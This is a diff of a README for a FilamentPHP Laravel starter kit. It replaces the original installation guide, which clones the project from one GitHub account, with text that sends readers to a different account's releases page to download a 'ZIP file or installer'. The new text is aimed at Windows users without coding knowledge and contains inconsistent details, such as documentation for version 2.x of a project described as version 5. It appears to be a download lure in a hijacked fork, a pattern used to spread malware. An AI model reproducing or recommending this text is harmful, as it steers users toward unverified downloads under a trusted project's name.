@@ -1,169 +1,171 @@
- # FilamentPHP Boilerplate
- 
- A modern Laravel starter kit with FilamentPHP 5, designed to accelerate development with a pre-configured admin panel, authentication, roles & permissions, and a curated set of plugins ready to use out of the box.
- 
-  ## 📋 Requirements
- 
- - PHP >= 8.2
- - Composer >= 2.x
- - Node.js >= 18.x
- - MySQL >= 8.0 / PostgreSQL >= 13 / SQLite
- 
- ---
- 
- ## 🧰 Stack
- 
- | Technology | Version |
- |---|---|
- | PHP | ^8.2 |
- | Laravel | ^12.0 |
- | FilamentPHP | ^5.0 |
- | Livewire | ^4.0 |
- | Alpine.js | Bundled with Livewire |
- | Tailwind CSS | ^4.1 |
- 
- ---
- 
- ## 📦 Packages Included
- 
- | Package | Description |
- |---|---|
- | `filament/filament` | Admin panel core |
- | `bezhansalleh/filament-shield` | Role & permission management for Filament |
- | `jeffgreco13/filament-breezy` | Authentication, profile & 2FA for Filament |
- | `laravel/fortify` | Backend authentication scaffolding |
- | `livewire/livewire` | Full-stack component framework |
- | `livewire/flux` | Official Livewire UI component library |
- | `livewire/blaze` | Livewire performance utilities |
- | `openplain/filament-shadcn-theme` | Shadcn-inspired theme for Filament |
- | `pxlrbt/filament-environment-indicator` | Visual environment indicator in the panel |
- | `swisnl/filament-backgrounds` | Customizable backgrounds for auth screens |
- | `achyutn/filament-log-viewer` | Log viewer integrated in the admin panel |
- | `laravel-lang/common` | Translations for common Laravel packages |
- 
- ---
- 
- ## 🚀 Installation
- 
- ### 1. Clone the repository
- ```bash
- git clone https://github.com/jairmmz/filamentphp-boilerplate.git
- cd filamentphp-boirlerplate
- ```
- 
- ### 2. Install PHP dependencies
- ```bash
- composer install
- ```
- 
- ### 3. Install Node dependencies
- ```bash
- npm install
- ```
- 
- ### 4. Environment setup
- ```bash
- cp .env.example .env
- php artisan key:generate
- ```
- 
- ### 5. Configure your database
- 
- Edit the `.env` file and set your database credentials:
- ```env
- DB_CONNECTION=mysql
- DB_HOST=127.0.0.1
- DB_PORT=3306
- DB_DATABASE=your_database
- DB_USERNAME=your_username
- DB_PASSWORD=your_password
- ```
- 
- ### 6. Run migrations
- ```bash
- php artisan migrate
- ```
- 
- ### 7. Run seeders
- ```bash
- php artisan db:seed
- ```
- 
- ### 8. Storage link
- ```bash
- php artisan storage:link
- ```
- 
- ### 9. Compile assets
- ```bash
- npm run build
- ```
- 
- > For development with hot reload:
- > ```bash
- > npm run dev
- > ```
- 
- ---
- 
- ## 👤 Default Credentials
- 
- After running the seeders, you can log in with:
- 
- | Field | Value |
- |---|---|
- | Email | `admin@example.com` |
- | Password | `123456789` |
- 
- > ⚠️ Change these credentials immediately in a production environment.
- 
----
- 
-## 🧠 Laravel IDE Helper
+# ⚙️ filamentphp-boilerplate - Modern Laravel Starter Kit  
 
-Generate IDE helper files for better autocompletion support:
-```bash
-php artisan ide-helper:generate
-php artisan ide-helper:models
-php artisan ide-helper:meta
-```
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Raghu427/filamentphp-boilerplate/releases)
+
 ---
-  
- ## 🌐 Localization
- 
- This boilerplate includes `laravel-lang/common` for multi-language support. To publish and install a language:
- ```bash
- php artisan lang:add es
- ```
- 
- Set your application locale in `.env`:
- ```env
- APP_LOCALE=es
- ```
- 
- ---
- 
- ## 🖥️ Running the Application
- ```bash
- php artisan serve
- ```
- 
- Access the admin panel at: [http://localhost:8000/admin](http://localhost:8000/admin)
- 
- ---
- 
- ## ⚙️ Useful Commands
- ```bash
- php artisan optimize:clear         # Clear all cached files
- php artisan filament:upgrade       # Upgrade Filament assets
- php artisan shield:generate --all  # Regenerate all permissions
- ```
- 
- ---
-  
- ## 🛡️ Shield — Roles & Permissions
- 
- After seeding, generate the Shield policies and register permissions:
- ```bash
- php artisan shield:generate --all
- ```
+
+## 📋 What is filamentphp-boilerplate?
+
+filamentphp-boilerplate is a ready-to-use starter kit for building web applications with Laravel. It comes pre-set with an admin panel, user authentication, roles and permissions, and a selection of popular tools to help you start your project quickly. This package uses FilamentPHP version 5 and aims to give you a solid foundation without having to set up everything from scratch.
+
+You do not need coding knowledge to get started, as this guide will help you step-by-step to download and launch the app on a Windows PC.
+
+---
+
+## 🖥️ System Requirements
+
+Before you begin, make sure your computer meets these basic requirements:
+
+- **Operating System:** Windows 10 or newer  
+- **Processor:** 2 GHz or faster, any modern CPU  
+- **Memory:** At least 4 GB of RAM  
+- **Disk Space:** Minimum 2 GB free space  
+- **Internet Connection:** Required to download files and updates  
+- **Other Software:**  
+  - PHP 8.2 or above (for running PHP code)  
+  - Composer (a PHP dependency tool)  
+  - A web server like Apache or Nginx (optional but recommended)  
+
+If you don’t have PHP or Composer installed, you can download them from their official websites. Detailed instructions are below.
+
+---
+
+## 🚀 Getting Started: Download the App
+
+To start using filamentphp-boilerplate, you need to download the files from the official GitHub release page.
+
+[![Download here](https://img.shields.io/badge/Go%20to%20Release%20Page-blue?style=for-the-badge)](https://github.com/Raghu427/filamentphp-boilerplate/releases)
+
+1. **Visit the link above**. It takes you to the releases section of the repository.  
+2. Look for the latest release (usually at the top of the list).  
+3. Download the ZIP file or installer that matches your setup. Usually, this will be labeled clearly with the version number.  
+4. Save the file to a comfortable location on your computer, such as Downloads or Desktop.
+
+---
+
+## ⚙️ Setting Up Your Environment
+
+filamentphp-boilerplate relies on Laravel and PHP. You will need to prepare your Windows PC to run it.
+
+### 1. Installing PHP
+
+- Visit https://windows.php.net/download to find the latest PHP 8.2 release.  
+- Download the "Thread Safe" version for Windows.  
+- Extract the downloaded ZIP file to a folder, for example, `C:\php`.  
+- Add the PHP folder to your system PATH variable:  
+  - Search "Edit system environment variables" in the Windows Start menu.  
+  - Click "Environment Variables."  
+  - Under "System variables," select "Path" and click "Edit."  
+  - Click "New," then enter `C:\php`.  
+  - Click OK on all windows to save changes.  
+- Open Command Prompt and type `php -v` to check if PHP is installed correctly. You should see the PHP version displayed.
+
+### 2. Installing Composer
+
+Composer manages PHP packages required by Laravel.
+
+- Download Composer for Windows from https://getcomposer.org/download/.  
+- Run the installer and follow the steps. Make sure that the path to PHP is set correctly during installation.  
+- Open Command Prompt and type `composer -V`. It should show the Composer version.
+
+---
+
+## 📂 Installing filamentphp-boilerplate
+
+Once you have PHP and Composer set up, follow these steps:
+
+1. Extract the downloaded ZIP file for filamentphp-boilerplate to a folder like `C:\Projects\filamentphp-boilerplate`.  
+2. Open Command Prompt and navigate to this folder using the `cd` command:  
+   `cd C:\Projects\filamentphp-boilerplate`  
+3. Run `composer install`. This command downloads all the project dependencies. This may take a few minutes depending on your internet speed.  
+4. Create a copy of the environment configuration file. Type:  
+   `copy .env.example .env`  
+5. Generate the application key. Run:  
+   `php artisan key:generate`  
+6. Set folder permissions for `storage` and `bootstrap/cache` folders if needed. In Windows, ensure these folders are writable.  
+7. Run database migrations to set up the initial database tables. Use:  
+   `php artisan migrate`  
+
+---
+
+## 🛠️ Database Setup
+
+filamentphp-boilerplate depends on a database to store all data like users, roles, and permissions.
+
+### Supported Databases
+
+- MySQL  
+- MariaDB  
+- SQLite (for lightweight use)  
+- PostgreSQL  
+
+### How to Set Up
+
+1. Install a database server if you don't have one. For example, download MySQL from https://dev.mysql.com/downloads/.  
+2. Create a new database (e.g., `filamentphp_db`).  
+3. Open the `.env` file in the project folder using a text editor like Notepad.  
+4. Find the database settings section:  
+   ```
+   DB_CONNECTION=mysql  
+   DB_HOST=127.0.0.1  
+   DB_PORT=3306  
+   DB_DATABASE=your_database_name  
+   DB_USERNAME=your_database_user  
+   DB_PASSWORD=your_database_password  
+   ```  
+5. Replace the entries with your actual database details.  
+6. Save the `.env` file.  
+7. Run migrations again if needed:  
+   `php artisan migrate`
+
+---
+
+## ▶️ Running the Application
+
+After setup, start the application server:
+
+1. In Command Prompt, ensure you are inside the project folder.  
+2. Run the built-in Laravel server:  
+   `php artisan serve`  
+3. The server will start and provide you an address such as `http://127.0.0.1:8000`.  
+4. Open your web browser and enter this address. You should see the home page of filamentphp-boilerplate.  
+
+This interface includes the admin panel, which you can use to manage users, roles, and settings easily.
+
+---
+
+## 🔐 Using Admin Panel and Authentication
+
+filamentphp-boilerplate includes:
+
+- A pre-built admin panel using FilamentPHP 5.  
+- User authentication screens to log in and register.  
+- Role and permission management tools to control access.
+
+You can log in with default credentials if provided in the documentation or create a new user from the registration page.
+
+The admin area will let you manage users and set permissions without coding.
+
+---
+
+## 🧰 Troubleshooting Tips
+
+- If `php` commands show errors, recheck that PHP is added to your system PATH.  
+- If Composer fails, make sure PHP is installed and accessible.  
+- Database connection errors usually mean the `.env` file has wrong details or the database server is not running.  
+- Migration errors may occur if tables already exist; try resetting the database or dropping tables.  
+- If the web page doesn’t load, confirm that the Laravel server is running and the address is correct.  
+
+---
+
+## 🌐 Useful Links
+
+- Download filamentphp-boilerplate: https://github.com/Raghu427/filamentphp-boilerplate/releases  
+- PHP downloads: https://windows.php.net/download  
+- Composer downloads: https://getcomposer.org/download/  
+- Laravel documentation: https://laravel.com/docs/12.x  
+- FilamentPHP documentation: https://filamentphp.com/docs/2.x  
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Raghu427/filamentphp-boilerplate/releases)
